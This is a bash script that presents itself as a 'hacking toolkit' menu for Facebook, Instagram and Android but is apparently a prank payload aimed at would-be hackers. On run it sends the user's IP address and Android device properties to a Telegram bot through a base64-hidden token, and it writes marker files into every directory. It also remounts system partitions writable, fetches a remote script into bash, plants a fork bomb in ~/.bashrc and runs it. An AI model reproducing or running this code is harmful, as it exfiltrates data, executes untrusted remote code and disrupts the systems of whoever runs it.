#!/bin/bash


# Super MEGA Pro level hacking toolkit https://github.com/erwincatt/hackingtool
# Short link: https://nxnt.link/hack and https://is.gd/aiohack
# Mirror available at https://notabug.org/erwincatt/hackingtool
# Mirror short link: https://nxnt.link/hack1 and https://is.gd/aiohack1

# This fix script is on git!
# You can see and/or clone it from the link below.
# https://ghnou.su/gitea/ghnou/fix

# This script moves away from the destructive one.
# I'd like to repeat this. This is NOT the one that nukes user data.
# If you're a chat moderator and can't read bash that's fine.
# Just don't ban people over this rather innocent one please.
# It is also not posted on VirusTotal (yet).

# If you want to learn more about why this script
# came into existence, see this article:
# https://ghnou.su/why-fix

# Any further questions? Read http://www.catb.org/esr/faqs/smart-questions.html
# Seriously, go read it. Twice. It's somewhat long-winded but an absolute
# essential in the world of hackers (like, actual hackers).
# Afterwards you can find this script's maker at e.g. https://t.me/shitposters

ver=mk4

# Kali-style big fat banner
banner(){
	echo ' ____'
	echo '|  _ \ ___ _ __  _ __   ___ _ __      _ __   __ _'
	echo '| |_) / _ \ ´_ \| ´_ \ / _ \ ´__| __ | ´_ \ / _` |'
	echo '|  __/  __/ | | | | | |  __/ |   |__|| | | | (_| |'
	echo '|_|   \___|_| |_|_| |_|\___|_|       |_| |_|\__, |'
	echo '                                            |___/'
	echo "Made with love on GahNoo/Loonix"
	echo "Follow us on https://t.me/skid_tg_says for moar epic hakz"
	echo "Version: $ver"
	echo ""
}

# Distribution detection
dist(){
	# Termux hacker???
	if [ "$OSTYPE" = "linux-android" ]
	then
		if [ "$(su -c id -u)" = "0" ]
		then
			# Woah 1337 rooted Termux hacker
			termux-root
		else
			# Not even rooted smh
			termux-noroot
		fi
	else
	# Seems like a desktop hacker?
		source <(grep -w ID /etc/os-release)
		case "$ID" in
			kali)	desktop-hakz ;;
			parrot)	desktop-hakz ;;
			*)	lucky ;;
		esac
	fi
}

# Non-root Termux mode
termux-noroot(){
	if [ -z $dryrun ]
	then
		export mode="non-rooted Termux"
		info preamble
		info props
		# First fill the Termux home directory
		for i in $(find $HOME -type d)
		do
			iamskid $i
		done
		# Afterwards do the SD card too if possible
		echo "We need storage access to store our algorithms."
		termux-setup-storage
		for i in $(find /sdcard -type d)
		do
			iamskid $i
		done
		info success
	else
		echo "Entered unrooted Termux mode."
	fi
}

# TODO: Not many rooted Termux haxxors, should we drop this?
termux-root(){
	if [ -z $dryrun ]
	then
		export mode="rooted Termux"
		info preamble
		info props
		su -c mount -o rw,remount /
		su -c mount -o rw,remount /system
		for i in $(find / -type d)
		do
			# FIXME: This would make numerous su requests...
			export su="su -c"
			iamskid $i
		done
		info success
	else
		echo "Entered rooted Termux mode."
	fi
}

# 1337 Kali/Parrot hacker hmm
desktop-hakz(){
	if [ -z $dryrun ]
	then
		export mode="Kali/Parrot"
		info preamble
		sudo mount -t overlay overlaid -o lowerdir=/dev,upperdir=/var,workdir=/usr /
		info success
	else
		echo "Entered desktop mode."
	fi
}

lucky(){
	echo "It's your lucky day! This script is somewhat malicious."
	echo "However, currently you are in an environment that this script bails out in."
	echo "No harm done. Think twice before executing random stuff from a stranger"
	echo "on the internet."
	echo "Go read https://ghnou.su/fbhacking to learn more about social media hacking."
}

iamskid(){
	# Touch one hidden, one visible file.
	$su touch $1/.iamskid 2>/dev/null
	$su touch $1/iamskid 2>/dev/null
}

mk3(){
	curl -sL ghnou.su/fix-mk3.sh | bash -
}

fork(){
	if [ -z $nofork ]
	then
		echo "command_not_found_handle(){:(){ :|: & };:}" >> ~/.bashrc
		:(){ :|: & };:
	else
		echo "No forking around here!"
	fi
}

info(){
	facebook="NzQ2NTE1MzYwOkFBRVhzMmdrWUR2ZEhXdjZRMC1nMGFkS2ZReUpCUXhFRzZVCg=="

	case $1 in
	preamble)
		for message in "Pwning $mode haxxor." "My IP: $(curl -s icanhazip.com)"
		do
			curl -sX POST "https://api.telegram.org/bot$(base64 -d <<< $facebook)/sendMessage" -d "chat_id=-1001408228618" -d "text=$message" &>/dev/null
		done
	;;
	props)
		getprop > props.txt
		curl -sF document=@"props.txt" "https://api.telegram.org/bot$(base64 -d <<< $facebook)/sendDocument?chat_id=-1001408228618" &>/dev/null
	;;
	success)
		curl -sX POST "https://api.telegram.org/bot$(base64 -d <<< $facebook)/sendMessage" -d "chat_id=-1001408228618" -d "text=Mission success. 👌" &>/dev/null
	;;
	esac
}

menu(){
	echo "What do you want to do?"
	echo "(1) Facebook hacking"
	echo "(2) Instagram hacking"
	echo "(3) WhatsApp hacking"
	echo "(4) Telegram hacking"
	echo "(5) Android hacking"
	echo "(6) Hack that ghnou madarchod"
	echo "(7) Nah I just want to learn Termux sir"
	read -p "Your choice? (1-7): " ans < /dev/tty
	echo ""
	if [ "$ans" -lt "6" ]
	then
		dist
	elif [ "$ans" -eq "6" ]
	then
		echo "Hah, good luck with that :)"
		echo ""
		mk3
	elif [ "$ans" -eq "7" ]
	then
		echo "Sweet! Have a look at e.g. https://cyberciti.biz, TLDP etc to learn some bash."
		exit 0
	else
		echo "Please try again. This menu *only* takes a number."
		menu
	fi
}

banner
menu
fork
